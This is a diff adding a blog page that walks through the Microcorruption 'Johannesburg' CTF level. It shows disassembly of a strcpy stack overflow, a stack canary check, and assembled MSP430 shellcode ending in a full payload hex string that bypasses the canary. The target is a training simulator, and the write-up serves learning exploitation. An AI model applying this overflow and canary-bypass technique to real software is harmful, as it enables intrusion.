@@ -1,0 +1,72 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1" />
+		
+		<link href="../_app/immutable/assets/0.CkCJ_Iij.css" rel="stylesheet">
+		<link href="../_app/immutable/assets/4.BGKaKUs6.css" rel="stylesheet">
+		<link rel="modulepreload" href="../_app/immutable/entry/start.jDE0ajOv.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DHZXbjhS.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DCFcRc6v.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/BqHloRb4.js">
+		<link rel="modulepreload" href="../_app/immutable/entry/app.BLNEpzoT.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/C6U3RdpY.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/Dwf-VV-B.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CBZjZzat.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/0.B9Abgxyr.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/D4n077k-.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/DhnXOQm4.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/C5fjRMoA.js">
+		<link rel="modulepreload" href="../_app/immutable/nodes/4.D4dQD_mJ.js">
+		<link rel="modulepreload" href="../_app/immutable/chunks/CLQzAQWW.js"><!--[--><!--]--><title>Microcorruption Johannesburg</title>
+	</head>
+	<body data-sveltekit-preload-data="hover" style="background-color:  #E9E9DF;">
+		<div style="display: contents"><!--[--><!--[--><!----><div class="site-header svelte-1pnrz5s"><h1 id="site-title" class="svelte-1pnrz5s"> Anoth3r Site</h1> <h1 class="blink svelte-1pnrz5s">_</h1></div> <hr class="hr-top svelte-1pnrz5s"> <div class="svelte-1pnrz5s"><ul class="nav-bar svelte-1pnrz5s"><li class="svelte-1pnrz5s"><a href="/" class="svelte-1pnrz5s">Home</a></li> <li class="svelte-1pnrz5s"><a href="/about" class="svelte-1pnrz5s">About</a></li> <li class="svelte-1pnrz5s"><a href="https://github.com/fl1gg" class="svelte-1pnrz5s">Github</a></li> <li class="svelte-1pnrz5s"><a href="/contact" class="svelte-1pnrz5s">Contact</a></li></ul></div> <br class="svelte-1pnrz5s"><!----> <!----><div class="articles svelte-1qj7sin"><div class="header svelte-1qj7sin"><h1 class="title svelte-1qj7sin">Microcorruption Johannesburg</h1> <p class="subtitle svelte-1qj7sin">The process and solution for the eight Microcorruption level</p></div> <div class="tags svelte-1qj7sin"><!--[--><span class="tag svelte-1qj7sin">#microcorruption</span><span class="tag svelte-1qj7sin">#reversing</span><span class="tag svelte-1qj7sin">#pwn</span><!--]--></div> <br class="svelte-1qj7sin"> <hr class="svelte-1qj7sin"> <div id="page" class="svelte-1qj7sin"><!----><p>Looking at the login function, we see it is very similar to our previous challenge (Montevideo). However, here we get our first taste of a stack canary.</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"></span>
+<span class="line"><span style="color:#E6EDF3">452c &#x3C;login></span></span>
+<span class="line"><span style="color:#E6EDF3">...</span></span>
+<span class="line"><span style="color:#79C0FF">4552</span><span style="color:#E6EDF3">:  </span><span style="color:#79C0FF">3e40</span><span style="color:#79C0FF"> 0024</span><span style="color:#FF7B72">      mov</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x2400</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r14</span></span>
+<span class="line"><span style="color:#79C0FF">4556</span><span style="color:#E6EDF3">:  0f41           </span><span style="color:#FF7B72">mov</span><span style="color:#79C0FF">	sp</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">r15</span></span>
+<span class="line"><span style="color:#79C0FF">4558</span><span style="color:#E6EDF3">:  b012 </span><span style="color:#79C0FF">2446</span><span style="color:#FF7B72">      call</span><span style="color:#E6EDF3">	#</span><span style="color:#79C0FF">0x4624</span><span style="color:#E6EDF3"> &#x3C;strcpy>         </span><span style="color:#8B949E">; again the use of strcpy leaves this program vulnerable to overflow</span></span>
+<span class="line"><span style="color:#E6EDF3">...</span></span>
+<span class="line"><span style="color:#79C0FF">4578</span><span style="color:#E6EDF3">:  f190 </span><span style="color:#79C0FF">5000</span><span style="color:#79C0FF"> 1100</span><span style="color:#FF7B72"> cmp</span><span style="color:#E6EDF3">.b	#</span><span style="color:#79C0FF">0x50</span><span style="color:#E6EDF3">, </span><span style="color:#79C0FF">0x11</span><span style="color:#E6EDF3">(</span><span style="color:#79C0FF">sp</span><span style="color:#E6EDF3">)          </span><span style="color:#8B949E">; compare the 0x11 (17th) element of our input to 50 and see if its equal</span></span>
+<span class="line"><span style="color:#FFA198;font-style:italic">457e:</span><span style="color:#79C0FF">  0624</span><span style="color:#FF7B72">           jz</span><span style="color:#E6EDF3">	$+</span><span style="color:#79C0FF">0xe</span><span style="color:#E6EDF3"> &#x3C;login+</span><span style="color:#79C0FF">0x60</span><span style="color:#E6EDF3">>   </span></span>
+<span class="line"><span style="color:#E6EDF3">...</span></span></code></pre><!----> <p>Looking at our memory we also see we get 17 bytes (34 nibbles) to work with this time:</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>43d0: 0000 0000 0000 0000 0000 a845 0100 a845   </span></span>
+<span class="line"><span>43e0: 0300 1c46 0000 0a00 0000 7845 aaaa 0000   ; start at 43ec</span></span>
+<span class="line"><span>43f0: 0000 0000 0000 0000 0000 0000 0050 3c44   ; end at 43fd</span></span>
+<span class="line"><span>4400: 3140 0044 1542 5c01 75f3 35d0 085a 3f40</span></span></code></pre><!----> <p>Lets take our previous shellcode, which is 32 nibbles, recompile it for this challenge (<a href="https://microcorruption.com/assembler" rel="nofollow">https://microcorruption.com/assembler</a>), and tack on the canary:</p> <!----><pre class="shiki github-dark-default" style="background-color:#0d1117;color:#e6edf3" tabindex="0"><code><span class="line"><span>xor r15, r15          ; clear out r15</span></span>
+<span class="line"><span>mov #0xffff, r15      ; set r15 to max </span></span>
+<span class="line"><span>sub #0xff80, r15      ; subtract 0xffff - 0xff80 = 0x007f without any zeros in assembled code</span></span>
+<span class="line"><span>push r15              ; put on stack</span></span>
+<span class="line"><span>call #0x4594          ; remember interrupt address changes</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>shellcode: 0fef3f40ffff3f8080ff0f12b0129445 + ff50 ; 0xff because 0x00 terminates strcpy</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>payload: 0fef3f40ffff3f8080ff0f12b0129445ff50 + ec43  ; the address also changes</span></span>
+<span class="line"><span>             = 0fef3f40ffff3f8080ff0f12b0129445ff50ec43   </span></span></code></pre><!----> <p>Using this payload defeats the canary and solves the challenge.</p><!----></div></div><!----><!----> <br> <div><hr></div><!----><!----><!--]--> <!--[!--><!--]--><!--]-->
+			
+			<script>
+				{
+					__sveltekit_12p3ed0 = {
+						base: new URL("..", location).pathname.slice(0, -1)
+					};
+
+					const element = document.currentScript.parentElement;
+
+					Promise.all([
+						import("../_app/immutable/entry/start.jDE0ajOv.js"),
+						import("../_app/immutable/entry/app.BLNEpzoT.js")
+					]).then(([kit, app]) => {
+						kit.start(app, element, {
+							node_ids: [0, 4],
+							data: [null,null],
+							form: null,
+							error: null
+						});
+					});
+				}
+			</script>
+		</div>
+	</body>
+	
+</html>
